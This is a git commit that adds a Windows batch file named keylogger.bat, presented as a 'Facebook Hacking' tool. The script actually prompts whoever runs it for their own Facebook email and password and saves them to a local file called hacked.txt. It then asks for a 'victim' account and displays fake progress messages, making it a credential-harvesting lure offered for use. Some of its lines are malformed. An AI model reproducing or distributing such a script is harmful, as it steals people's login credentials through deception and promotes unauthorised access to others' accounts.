3207e83b705850e3facc3d821eae393b60095414
Kweezi Perez Christopher <kweeziperez712@gmail.com>
2021-05-14 16:43:06 +0300

    Add files via upload

---
+++ keylogger.bat
@@ -0,0 +1,35 @@
+@echo off
+color a
+title Facebook Hacking:Login:
+cls
+echo Please Enter Your Facebook Email Adress And Password
+echo To Hack Any Facebook Account
+echo.
+echo.
+cd "E:\thehackerstuff"
+set/p user=Email ID:
+set/p pass=Password:
+echo Username='%user%'Password='%pass%'>hacked.txt
+echo.
+echo.
+echo Press any key to continue
+pause >n
+echo Loading.....
+echo.
+echo.
+echo Enter Facebook Id of Victim
+Set/p user=Email ID:
+echo Username="%user%">Victim.txt
+echo.
+echo Press any key to hack this ID
+echo.
+echo.
+pause >
+echo.
+echo Processing...
+echo.
+echo.
+echo.
+echo.
+echo.
+pause >n
